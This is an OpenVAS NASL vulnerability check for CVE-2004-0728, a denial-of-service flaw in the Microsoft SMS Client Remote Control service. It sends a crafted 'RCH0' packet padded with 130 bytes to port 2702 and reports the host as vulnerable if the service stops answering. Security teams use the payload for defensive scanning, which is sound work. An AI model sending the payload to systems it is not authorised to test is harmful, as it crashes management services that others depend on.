###############################################################################
# OpenVAS Vulnerability Test
# $Id: mssms_dos.nasl 4831 2016-12-21 12:32:45Z cfi $
#
# Denial of Service (DoS) in Microsoft SMS Client
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Subject: Denial of Service (DoS) in Microsoft SMS Client
# From: vuln@hexview.com
# Date: 14.7.2004 21:45

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.13752");
  script_version("$Revision: 4831 $");
  script_cve_id("CVE-2004-0728");
  script_bugtraq_id(10726);
  script_tag(name:"last_modification", value:"$Date: 2016-12-21 13:32:45 +0100 (Wed, 21 Dec 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Denial of Service (DoS) in Microsoft SMS Client");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(2702);

  tag_summary = "Microsoft Systems Management Server provides configuration management
  solution for Windows platform. It is widely deployed in medium and large
  network environments. A flaw in SMS Remote Control service makes possible to
  crash the service remotely leading to the DoS condition.

  Affected products:
  All tests were performed on a client part of Microsoft Systems Management
  Server version 2.50.2726.0.";

  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

debug = 0;

port = 2702;
if( ! get_port_state( port ) ) exit( 0 );
soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

req = raw_string( 0x52, 0x43, 0x48, 0x30, 0x16, 0x00, 0x40, 0x00, 0x52, 0x43, 0x48, 0x45 );
req = string(req, crap( data:raw_string( 0x58 ), length:130 ) );

if( debug ) {
  display( "req: ", req, "\n" );
}

send( socket:soc, data:req );
sleep( 1 );
close( soc );

soc = open_sock_tcp( port );

if( ! soc ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );